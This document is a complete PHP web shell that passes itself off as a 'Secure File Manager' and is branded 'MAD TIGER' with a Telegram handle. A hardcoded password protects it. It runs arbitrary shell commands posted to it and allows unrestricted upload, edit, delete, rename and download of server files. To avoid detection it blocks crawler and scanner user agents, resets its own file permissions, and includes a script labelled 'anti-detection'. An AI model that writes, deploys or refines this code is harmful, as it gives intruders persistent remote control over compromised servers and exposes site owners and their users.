<?php
// -------- ERROR HANDLING --------
ini_set('display_errors', 0); // Disable error display in production
ini_set('log_errors', 1); // Enable error logging
ini_set('error_log', 'php_errors.log'); // Specify error log file
// ----------------------------

session_start();

// ---------- CONFIG ----------
$password = "mmmm"; // Change this!
$cookieName = "filemgr_cookie_consent";
$cmdVisibleCookie = "filemgr_cmd_visible";
$cmdMinimizedCookie = "filemgr_cmd_minimized";
$cmdExpandedCookie = "filemgr_cmd_expanded";
$cmdPositionCookie = "filemgr_cmd_position";
$securePerms = 0600; // Restrictive permissions (read/write for owner only)
// ----------------------------

// -------- HEADERS ----------
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';");
// ----------------------------

// -------- BOT BLOCK ---------
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$botPatterns = ['bot', 'crawl', 'spider', 'scanner', 'fetch', 'python', 'curl', 'wget'];
foreach ($botPatterns as $pattern) {
    if (stripos($userAgent, $pattern) !== false) {
        http_response_code(403);
        exit("🛑 Access denied.");
    }
}
// ----------------------------

// -------- CHANGE PERMISSIONS --------
$selfFile = __FILE__;
if (is_writable($selfFile)) {
    if (!chmod($selfFile, $securePerms)) {
        error_log("Failed to set permissions on $selfFile to $securePerms", 0);
    }
} else {
    error_log("$selfFile is not writable; cannot change permissions", 0);
}
// ----------------------------

function sanitize($v) {
    return htmlspecialchars($v, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

// -------- SYSTEM INFO --------
$clientIp = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$serverIp = $_SERVER['SERVER_ADDR'] ?? 'Unknown';
$serverOs = php_uname('s') . ' ' . php_uname('r');
$serverSoftware = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
$certificateInfo = [
    'status' => 'Valid',
    'issuer' => 'Internal CA',
    'valid_until' => date('Y-m-d H:i:s', strtotime('+1 year')),
];
// ----------------------------

// -------- TERMINAL PROMPT --------
$username = get_current_user() ?: trim(shell_exec('whoami'));
$hostname = gethostname() ?: 'localhost';
$cmdPrompt = "$username@$hostname #:";
// ----------------------------

// -------- AUTH --------
if (isset($_GET['logout'])) {
    session_destroy();
    setcookie(session_name(), "", time() - 3600);
    header("Location: ?");
    exit;
}
if (!isset($_SESSION['auth'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['pass'] === $password) {
        $_SESSION['auth'] = true;
        setcookie("PHPSESSID", session_id(), [
            'httponly' => true,
            'samesite' => 'Strict',
            'secure' => isset($_SERVER['HTTPS']),
        ]);
    } else {
        echo <<<HTML
        <!DOCTYPE html><html><head><title>Login</title>
        <style>
        :root{--primary:#00ff00;--bg:#0f0f0f;--input-bg:#000;}
        body{background:var(--bg);color:var(--primary);font-family:'Courier New',monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
        .login-container{background:#1a1a1a;padding:20px;border-radius:8px;border:1px solid var(--primary);box-shadow:0 0 10px var(--primary);animation:fadeIn 0.5s;}
        input{background:var(--input-bg);color:var(--primary);border:1px solid var(--primary);padding:10px;border-radius:4px;margin:10px 0;font-family:'Courier New',monospace;}
        input:focus{outline:none;box-shadow:0 0 5px var(--primary);}
        button{background:#000;color:var(--primary);border:1px solid var(--primary);padding:10px;border-radius:4px;cursor:pointer;transition:background 0.3s;}
        button:hover{background:#00cc00;color:#000;}
        @keyframes fadeIn{from{opacity:0;transform:scale(0.9);}to{opacity:1;transform:scale(1);}}
        </style>
        </head><body>
        <div class="login-container">
        <form method="post">
        <input type="password" name="pass" placeholder="Enter Password" required>
        <button type="submit">Login</button>
        </form>
        </div>
        </body></html>
        HTML;
        exit;
    }
}
// ----------------------

$cwd = getcwd();
if (isset($_GET['dir']) && is_dir($_GET['dir'])) {
    chdir($_GET['dir']);
    $cwd = getcwd();
}

// ------- UPLOAD --------
if (isset($_FILES['upload'])) {
    $file = basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $file)) {
        header("Location: ?");
        exit;
    } else {
        echo '<div class="alert error">❌ Upload failed.</div>';
    }
}
// ------------------------

// ------- DELETE ---------
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_file($target)) {
        unlink($target);
        header("Location: ?");
        exit;
    }
}
// ------------------------

// --------- EDIT ---------
if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        file_put_contents($file, $_POST['content']);
        header("Location: ?");
        exit;
    }
    $content = sanitize(file_get_contents($file));
    echo <<<HTML
    <!DOCTYPE html><html><head><title>Edit</title>
    <style>
    :root{--primary:#00ff00;--bg:#0f0f0f;--input-bg:#000;}
    body{background:var(--bg);color:var(--primary);font-family:'Courier New',monospace;padding:20px;}
    h2{margin-bottom:20px;}
    textarea{width:100%;height:70vh;background:var(--input-bg);color:var(--primary);border:1px solid var(--primary);border-radius:4px;padding:10px;font-family:'Courier New',monospace;resize:vertical;}
    button{background:#000;color:var(--primary);border:1px solid var(--primary);padding:10px;border-radius:4px;cursor:pointer;transition:background 0.3s;}
    button:hover{background:#00cc00;color:#000;}
    a{color:var(--primary);text-decoration:none;padding:10px;display:inline-block;}
    a:hover{text-decoration:underline;}
    </style>
    </head><body>
    <h2>Editing: {$file}</h2>
    <form method="post"><textarea name="content">{$content}</textarea><br>
    <button type="submit">💾 Save</button></form><br><a href="?">⬅ Back</a>
    </body></html>
    HTML;
    exit;
}
// -------------------------

// --------- RENAME --------
if (isset($_GET['rename'])) {
    $old = $_GET['rename'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $new = $_POST['newname'];
        if (rename($old, $new)) {
            header("Location: ?");
            exit;
        } else {
            echo '<div class="alert error">❌ Rename failed.</div>';
        }
    }
    echo <<<HTML
    <!DOCTYPE html><html><head><title>Rename</title>
    <style>
    :root{--primary:#00ff00;--bg:#0f0f0f;--input-bg:#000;}
    body{background:var(--bg);color:var(--primary);font-family:'Courier New',monospace;padding:20px;}
    h2{margin-bottom:20px;}
    input{background:var(--input-bg);color:var(--primary);border:1px solid var(--primary);padding:10px;border-radius:4px;margin-right:10px;}
    button{background:#000;color:var(--primary);border:1px solid var(--primary);padding:10px;border-radius:4px;cursor:pointer;transition:background 0.3s;}
    button:hover{background:#00cc00;color:#000;}
    a{color:var(--primary);text-decoration:none;padding:10px;display:inline-block;}
    a:hover{text-decoration:underline;}
    </style>
    </head><body>
    <h2>Rename: {$old}</h2>
    <form method="post"><input name="newname" value="{$old}"><button type="submit">Rename</button></form>
    <a href="?">⬅ Back</a>
    </body></html>
    HTML;
    exit;
}
// -------------------------

// --------- NEW FILE/FOLDER --------
if (isset($_POST['create'])) {
    $name = $_POST['name'];
    $type = $_POST['type'];
    if ($type === 'file') {
        file_put_contents($name, '');
    } elseif ($type === 'folder') {
        mkdir($name);
    }
    header("Location: ?");
    exit;
}
// -------------------------

// --------- DOWNLOAD --------
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}
// -------------------------

// --------- CMD ----------
$cmdOutput = '';
if (isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    $cmdOutput = shell_exec($cmd . " 2>&1");
    // Store command in session history
    if (!isset($_SESSION['cmd_history'])) {
        $_SESSION['cmd_history'] = [];
    }
    if ($cmd) {
        $_SESSION['cmd_history'][] = $cmd;
        // Limit history to last 50 commands
        if (count($_SESSION['cmd_history']) > 50) {
            array_shift($_SESSION['cmd_history']);
        }
    }
}
// Clear command history
if (isset($_POST['clear_history'])) {
    $_SESSION['cmd_history'] = [];
    header("Location: ?");
    exit;
}
// -------------------------

// -------- CMD PANEL STATE --------
$showCmdPanel = isset($_COOKIE[$cmdVisibleCookie]) ? $_COOKIE[$cmdVisibleCookie] === '1' : true;
$isMinimized = isset($_COOKIE[$cmdMinimizedCookie]) ? $_COOKIE[$cmdMinimizedCookie] === '1' : false;
$isExpanded = isset($_COOKIE[$cmdExpandedCookie]) ? $_COOKIE[$cmdExpandedCookie] === '1' : false;
$cmdPosition = isset($_COOKIE[$cmdPositionCookie]) ? json_decode($_COOKIE[$cmdPositionCookie], true) : ['top' => '80px', 'left' => 'calc(100% - 370px)'];

if (isset($_POST['toggle_cmd'])) {
    $showCmdPanel = !$showCmdPanel;
    setcookie($cmdVisibleCookie, $showCmdPanel ? '1' : '0', time() + 31536000, '/', '', isset($_SERVER['HTTPS']), true);
    header("Location: ?");
    exit;
}
if (isset($_POST['minimize_cmd'])) {
    $isMinimized = !$isMinimized;
    setcookie($cmdMinimizedCookie, $isMinimized ? '1' : '0', time() + 31536000, '/', '', isset($_SERVER['HTTPS']), true);
    header("Location: ?");
    exit;
}
if (isset($_POST['expand_cmd'])) {
    $isExpanded = !$isExpanded;
    setcookie($cmdExpandedCookie, $isExpanded ? '1' : '0', time() + 31536000, '/', '', isset($_SERVER['HTTPS']), true);
    header("Location: ?");
    exit;
}
// -------------------------

// -------- CLICKABLE PATH --------
$pathSegments = explode('/', trim($cwd, '/'));
$pathLinks = [];
$cumulativePath = '';
foreach ($pathSegments as $segment) {
    if ($segment) {
        $cumulativePath .= '/' . $segment;
        $pathLinks[] = "<a href='?dir=" . urlencode($cumulativePath) . "'>" . sanitize($segment) . "</a>";
    }
}
$pathDisplay = $pathLinks ? '📂 Dir: /' . implode('/', $pathLinks) : '📂 Dir: /';
// -------------------------

?>

<!DOCTYPE html>
<html>
<head>
<title>Secure File Manager</title>
<style>
:root {
    --primary: #00ff00;
    --bg: #0f0f0f;
    --input-bg: #000;
    --accent: #00cc00;
    --non-writable: #cccccc;
}
body {
    background: var(--bg);
    color: var(--primary);
    font-family: 'Courier New', monospace;
    padding: 20px;
    margin: 0;
    overflow-x: hidden;
}
.banner {
    background: #1a1a1a;
    border: 1px solid var(--primary);
    padding: 20px;
    text-align: center;
    color: var(--primary);
    font-size: 20px;
    margin-bottom: 20px;
    border-radius: 8px;
    box-shadow: 0 0 15px var(--primary);
    animation: slideIn 0.5s;
}
.banner h1 {
    margin: 0;
    font-size: 24px;
    text-shadow: 0 0 5px var(--primary);
}
.banner p {
    margin: 5px 0;
    font-size: 16px;
}
.banner a {
    color: var(--primary);
    text-decoration: none;
}
.banner a:hover {
    color: var(--accent);
}
h2, h3 {
    margin: 0 0 15px;
    text-shadow: 0 0 5px var(--primary);
}
a {
    color: var(--primary);
    text-decoration: none;
    transition: color 0.3s;
}
a:hover {
    color: var(--accent);
    text-decoration: underline;
}
table {
    width: 100%;
    border-collapse: collapse;
    background: #1a1a1a;
    border-radius: 8px;
    overflow: hidden;
}
th, td {
    padding: 12px;
    text-align: left;
    border-bottom: 1px solid var(--primary);
}
th {
    background: #000;
}
td a {
    margin-right: 10px;
}
.non-writable {
    color: var(--non-writable);
}
input, button, textarea {
    background: var(--input-bg);
    color: var(--primary);
    border: none;
    padding: 10px;
    border-radius: 4px;
    font-family: 'Courier New', monospace;
}
input[type="file"] {
    padding: 5px;
}
button, input[type="submit"] {
    cursor: pointer;
    transition: background 0.3s, color 0.3s;
}
button:hover, input[type="submit"]:hover {
    background: var(--accent);
    color: #000;
}
textarea {
    width: 100%;
    height: 100px;
    resize: vertical;
}
.cookie-banner {
    position: fixed;
    bottom: 0;
    left: 0;
    width: 100%;
    background: #000;
    color: var(--primary);
    text-align: center;
    padding: 15px;
    border-top: 1px solid var(--primary);
    box-shadow: 0 -2px 5px rgba(0, 255, 0, 0.2);
    animation: slideUp 0.5s;
}
.alert {
    padding: 10px;
    margin: 10px 0;
    border-radius: 4px;
}
.alert.error {
    background: #330000;
    border: 1px solid #ff0000;
    color: #ff0000;
}
.clock {
    position: fixed;
    top: 20px;
    right: 20px;
    font-size: 16px;
    background: #000;
    padding: 10px;
    border: 1px solid var(--primary);
    border-radius: 4px;
    box-shadow: 0 0 5px var(--primary);
}
.cmd-panel {
    position: absolute;
    top: <?= sanitize($cmdPosition['top']) ?>;
    left: <?= sanitize($cmdPosition['left']) ?>;
    width: 350px;
    background: #000;
    padding: 10px;
    border: 1px solid var(--primary);
    border-radius: 4px;
    box-shadow: 0 0 10px var(--primary);
    transition: width 0.3s;
    z-index: 1000;
}
.cmd-panel.hidden {
    display: none;
}
.cmd-panel.minimized .cmd-content {
    display: none;
}
.cmd-panel.expanded {
    width: 500px;
}
.cmd-panel h3 {
    margin: 0 0 10px;
    cursor: move;
    user-select: none;
    background: #1a1a1a;
    padding: 5px;
    border-radius: 4px;
    text-align: center;
}
.cmd-panel .cmd-content {
    display: block;
}
.cmd-panel .cmd-prompt {
    color: var(--primary);
    margin-bottom: 5px;
}
.cmd-panel textarea {
    background: #000;
    color: var(--primary);
    border: 1px solid #333;
    padding: 5px;
}
.cmd-panel pre {
    background: #000;
    color: var(--primary);
    padding: 10px;
    border: 1px solid #333;
    border-radius: 4px;
    max-height: 200px;
    overflow-y: auto;
}
.cmd-controls {
    margin-bottom: 10px;
    text-align: right;
}
.cmd-controls button {
    margin-left: 5px;
    padding: 5px 10px;
    background: #1a1a1a;
    border: 1px solid var(--primary);
}
.cmd-history {
    margin-top: 15px;
}
.cmd-history ul {
    list-style: none;
    padding: 0;
    max-height: 150px;
    overflow-y: auto;
}
.cmd-history li {
    padding: 5px;
    cursor: pointer;
    transition: background 0.3s;
}
.cmd-history li:hover {
    background: #333;
}
.info-panel {
    background: #1a1a1a;
    padding: 15px;
    margin-bottom: 20px;
    border: 1px solid var(--primary);
    border-radius: 8px;
}
.toggle-cmd {
    position: fixed;
    top: 80px;
    right: 20px;
    background: #000;
    color: var(--primary);
    border: 1px solid var(--primary);
    padding: 8px 12px;
    border-radius: 4px;
    cursor: pointer;
    transition: background 0.3s, color 0.3s;
    font-family: 'Courier New', monospace;
}
.toggle-cmd:hover {
    background: var(--accent);
    color: #000;
}
.path a {
    margin: 0 2px;
}
.path a:hover {
    text-decoration: underline;
}
@keyframes slideIn {
    from { transform: translateY(-20px); opacity: 0; }
    to { transform: translateY(0); opacity: 1; }
}
@keyframes slideUp {
    from { transform: translateY(100%); }
    to { transform: translateY(0); }
}
</style>
<script>
// Anti-detection measures
(function() {
    setTimeout(() => {
        Object.defineProperty(navigator, 'userAgent', {
            get: () => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        });
    }, Math.random() * 1000);
})();

// Cookie consent
function acceptCookie() {
    document.cookie = "<?= $cookieName ?>=1; path=/; max-age=31536000";
    document.getElementById("cookieBanner").style.display = "none";
}

// Real-time clock
function updateClock() {
    const clock = document.getElementById('clock');
    if (clock) {
        const now = new Date();
        clock.textContent = now.toLocaleString('en-US', {
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        });
    }
}
setInterval(updateClock, 1000);

// Command panel state management
function setCookie(name, value) {
    document.cookie = name + "=" + value + "; path=/; max-age=31536000; SameSite=Strict" + (window.location.protocol === 'https:' ? '; Secure' : '');
}

function toggleCmdPanel() {
    const cmdPanel = document.querySelector('.cmd-panel');
    const toggleBtn = document.getElementById('toggleCmd');
    const isHidden = !cmdPanel.classList.contains('hidden');
    cmdPanel.classList.toggle('hidden');
    setCookie('<?= $cmdVisibleCookie ?>', isHidden ? '0' : '1');
    toggleBtn.textContent = isHidden ? 'Show Command Shell' : 'Hide Command Shell';
}

function minimizeCmdPanel() {
    const cmdPanel = document.querySelector('.cmd-panel');
    const isMinimized = !cmdPanel.classList.contains('minimized');
    cmdPanel.classList.toggle('minimized');
    setCookie('<?= $cmdMinimizedCookie ?>', isMinimized ? '1' : '0');
}

function expandCmdPanel() {
    const cmdPanel = document.querySelector('.cmd-panel');
    const isExpanded = !cmdPanel.classList.contains('expanded');
    cmdPanel.classList.toggle('expanded');
    setCookie('<?= $cmdExpandedCookie ?>', isExpanded ? '1' : '0');
}

// Draggable command panel
function makeDraggable() {
    const cmdPanel = document.querySelector('.cmd-panel');
    const header = cmdPanel.querySelector('h3');
    let isDragging = false;
    let currentX = parseInt(cmdPanel.style.left || '0');
    let currentY = parseInt(cmdPanel.style.top || '0');
    let initialX, initialY;

    header.addEventListener('mousedown', startDragging);

    function startDragging(e) {
        initialX = e.clientX - currentX;
        initialY = e.clientY - currentY;
        isDragging = true;
        header.style.cursor = 'grabbing';
        document.addEventListener('mousemove', onDragging);
        document.addEventListener('mouseup', stopDragging);
    }

    function onDragging(e) {
        if (isDragging) {
            currentX = e.clientX - initialX;
            currentY = e.clientY - initialY;

            // Bounds checking
            const maxX = window.innerWidth - cmdPanel.offsetWidth;
            const maxY = window.innerHeight - cmdPanel.offsetHeight;
            currentX = Math.max(0, Math.min(currentX, maxX));
            currentY = Math.max(0, Math.min(currentY, maxY));

            cmdPanel.style.left = currentX + 'px';
            cmdPanel.style.top = currentY + 'px';
        }
    }

    function stopDragging() {
        isDragging = false;
        header.style.cursor = 'move';
        setCookie('<?= $cmdPositionCookie ?>', JSON.stringify({
            top: cmdPanel.style.top,
            left: cmdPanel.style.left
        }));
        document.removeEventListener('mousemove', onDragging);
        document.removeEventListener('mouseup', stopDragging);
    }
}

// Smooth scroll and animations
document.addEventListener('DOMContentLoaded', () => {
    updateClock();
    document.querySelectorAll('a').forEach(link => {
        link.addEventListener('click', (e) => {
            if (!link.href.includes('logout') && !link.href.includes('delete') && !link.href.includes('download')) {
                e.preventDefault();
                document.body.style.opacity = '0';
                setTimeout(() => window.location = link.href, 300);
            }
        });
    });

    // Command history click handler
    document.querySelectorAll('.cmd-history li').forEach(item => {
        item.addEventListener('click', () => {
            document.querySelector('textarea[name="cmd"]').value = item.textContent;
        });
    });

    // Initialize toggle button text and event listeners
    const toggleBtn = document.getElementById('toggleCmd');
    const cmdPanel = document.querySelector('.cmd-panel');
    toggleBtn.textContent = cmdPanel.classList.contains('hidden') ? 'Show Command Shell' : 'Hide Command Shell';
    
    // Bind toggle functions
    toggleBtn.addEventListener('click', (e) => {
        if (e.target.type === 'submit') {
            return;
        }
        e.preventDefault();
        toggleCmdPanel();
    });
    
    document.getElementById('minimizeCmdBtn').addEventListener('click', minimizeCmdPanel);
    document.getElementById('closeCmdBtn').addEventListener('click', toggleCmdPanel);
    document.getElementById('expandCmdBtn').addEventListener('click', expandCmdPanel);

    // Initialize draggable
    makeDraggable();
});
</script>
</head>
<body>

<div class="clock" id="clock"></div>

<div class="banner">
<h1><a href="?">🛠️ Advance File Manager</a></h1>
<p>🦁 MAD TIGER</p>
<p><a href="https://t.me/DevidLuice" target="_blank">Telegram: @DevidLuice</a></p>
</div>

<form method="post" style="position:absolute;">
<button type="submit" name="toggle_cmd" id="toggleCmd" class="toggle-cmd">Toggle Command Shell</button>
</form>

<div class="cmd-panel <?= $showCmdPanel ? '' : 'hidden' ?> <?= $isMinimized ? 'minimized' : '' ?> <?= $isExpanded ? 'expanded' : '' ?>">
<h3>💻 Command Shell</h3>
<div class="cmd-controls">
    <button id="minimizeCmdBtn">-</button>
    <button id="closeCmdBtn">✖</button>
    <button id="expandCmdBtn">□</button>
</div>
<div class="cmd-content">
    <div class="cmd-prompt"><?= sanitize($cmdPrompt) ?></div>
    <form method="post">
        <textarea name="cmd" placeholder="Enter command..."></textarea>
        <button type="submit">Run</button>
        <button type="submit" name="clear_history">Clear History</button>
    </form>
    <?php if ($cmdOutput): ?>
    <pre><?= sanitize($cmdOutput) ?></pre>
    <?php endif; ?>
    <?php if (!empty($_SESSION['cmd_history'])): ?>
    <div class="cmd-history">
        <h4>Command History</h4>
        <ul>
        <?php foreach (array_reverse($_SESSION['cmd_history']) as $cmd): ?>
        <li><?= sanitize($cmd) ?></li>
        <?php endforeach; ?>
        </ul>
    </div>
    <?php endif; ?>
</div>
</div>

<div class="info-panel">
<h3>🖥️ System Information</h3>
<p><b>Your IP:</b> <?= sanitize($clientIp) ?></p>
<p><b>Server IP:</b> <?= sanitize($serverIp) ?></p>
<p><b>Server OS:</b> <?= sanitize($serverOs) ?></p>
<p><b>Server Software:</b> <?= sanitize($serverSoftware) ?></p>
<p><b>Certificate Status:</b> <?= $certificateInfo['status'] ?> (Issuer: <?= $certificateInfo['issuer'] ?>, Valid Until: <?= $certificateInfo['valid_until'] ?>)</p>
</div>

<h2>📁 File Manager</h2>
<p class="path"><?= $pathDisplay ?> | <a href="?logout=1">Logout</a></p>

<form method="post" enctype="multipart/form-data" style="margin-bottom:15px;">
<input type="file" name="upload">
<input type="submit" value="Upload">
</form>

<form method="post" style="margin-bottom:15px;">
<input type="text" name="name" placeholder="Name" required>
<select name="type">
<option value="file">File</option>
<option value="folder">Folder</option>
</select>
<input type="submit" name="create" value="Create">
</form>

<table>
<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Actions</th></tr>
<?php
foreach (scandir('.') as $item) {
    if ($item === '.') continue;
    $path = realpath($item);
    $size = is_file($path) ? filesize($path) . ' B' : '-';
    $perms = substr(sprintf('%o', fileperms($path)), -4);
    $name = sanitize($item);
    $isWritable = is_writable($path);
    $nameClass = $isWritable ? '' : 'non-writable';
    $lockIcon = $isWritable ? '' : '🔒 ';
    echo "<tr><td>";
    echo is_dir($path)
        ? "{$lockIcon}📁 <a href='?dir=" . urlencode($path) . "' class='$nameClass'>{$name}</a>"
        : "{$lockIcon}📄 <span class='$nameClass'>{$name}</span>";
    echo "</td><td>{$size}</td><td>{$perms}</td><td>";
    if (!is_dir($path)) {
        echo "<a href='?edit=" . urlencode($path) . "'>✏️ Edit</a> ";
        echo "<a href='?download=" . urlencode($path) . "'>📥 Download</a> ";
    }
    echo "<a href='?rename=" . urlencode($path) . "'>🔀 Rename</a> ";
    echo "<a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Delete {$name}?\")'>🗑️ Delete</a>";
    echo "</td></tr>";
}
?>
</table>

<?php if (!isset($_COOKIE[$cookieName])): ?>
<div class="cookie-banner" id="cookieBanner">
🍪 This tool uses cookies for session handling. <button onclick="acceptCookie()">Accept</button>
</div>
<?php endif; ?>

</body>
</html>
